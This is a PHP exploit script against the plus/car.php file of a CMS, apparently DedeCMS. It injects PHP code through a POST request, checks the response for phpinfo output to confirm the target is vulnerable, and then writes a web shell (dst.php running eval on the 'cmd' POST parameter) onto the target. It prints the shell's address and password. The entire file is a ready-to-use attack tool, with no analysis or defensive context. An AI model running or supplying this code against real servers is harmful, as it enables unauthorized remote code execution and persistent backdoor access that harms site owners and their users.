<?php 
error_reporting(0);
$host=$argv[1];
$path=$argv[2];
$path=$path."plus/car.php";
$url=$path;
if(count($argv) < 3 ){
print_r('
Usage: php '.$argv[0].' host path
Example:
php '.$argv[0].' www.site.com /dede/
作者：镜花水月
修改：八嘎
');
   exit;
   }
$data='$a=${@phpinfo()};';
$buffer = POST($host,80,$url,$data,30);
preg_match("/allow_url_fopen/i", $buffer, $arr_suc);

$str="allow_url_fopen";
if($arr_suc[0]==$str) {
echo "Congratulations,target exist this bug.\n";
$data='$a=${@file_put_contents("dst.php","<?php eval(\$_POST[cmd]); ?>")};';
$buffer = POST($host,80,$url,$data,30);
echo "shell:http://$host$argv[2]plus/dst.php,pass:cmd.";
}
else {
   echo "Sorry,target may  not exist this bug.";
   exit;
   }
function POST($host,$port,$path,$data,$timeout, $cookie='') {
$buffer='';
    $fp = fsockopen($host,$port,$errno,$errstr,$timeout);
    if(!$fp) die($host.'/'.$path.' : '.$errstr.$errno); 
else {
        fputs($fp, "POST $path HTTP/1.0\r\n");
        fputs($fp, "Host: $host\r\n");
        fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
        fputs($fp, "Content-length: ".strlen($data)."\r\n");
        fputs($fp, "Connection: close\r\n\r\n");
        fputs($fp, $data."\r\n\r\n");
       
  while(!feof($fp)) 
  {
   $buffer .= fgets($fp,4096);
  }  
  fclose($fp);
    } 
return $buffer;
} 
?>